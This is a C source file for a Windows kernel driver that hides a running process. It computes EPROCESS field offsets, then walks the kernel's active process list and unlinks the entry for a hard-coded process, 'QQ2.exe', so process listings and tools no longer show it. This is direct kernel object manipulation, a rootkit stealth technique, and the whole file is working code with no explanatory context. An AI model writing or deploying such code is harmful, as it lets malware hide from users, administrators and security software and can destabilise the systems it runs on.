#include <ntddk.h>
#include <ntstrsafe.h>
#include "Offset.h"
#include "Hide.h"

static ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;

BOOLEAN InitializeOffsets()
{
	nameOffset = CalcProcessNameOffset();
	pidOffset = CalcPIDOffset();
	listEntryOffset = pidOffset + sizeof(HANDLE);

	if (pidOffset == 0 || nameOffset == 0)
		return FALSE;
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "NameOffset Address: 0x%X\n", nameOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PID Address: 0x%X\n", pidOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "ListEntry Address: 0x%X\n", listEntryOffset);
		return TRUE;
	}
}

VOID HideProcess()
{
	PLIST_ENTRY head, currentNode, prevNode;
	PEPROCESS eprocessStart;
	unsigned char* currentProcess = NULL;
	const char target[] = "QQ2.exe";
	ANSI_STRING targetProcessName, currentProcessName;
	
	eprocessStart = IoGetCurrentProcess();
	head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
	RtlInitAnsiString(&targetProcessName, target);

	do
	{
		currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
		RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));

		if (RtlCompareString(&targetProcessName, &currentProcessName, FALSE) == 0)
		{
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Found target process %s.\n", target);
			prevNode = currentNode->Blink;
			prevNode->Flink = currentNode->Flink;

			currentNode->Flink->Blink = prevNode;

			currentNode->Flink = currentNode;
			currentNode->Blink = currentNode;
			break;
		}

		currentNode = currentNode->Flink;
	} while (currentNode->Flink != head);
}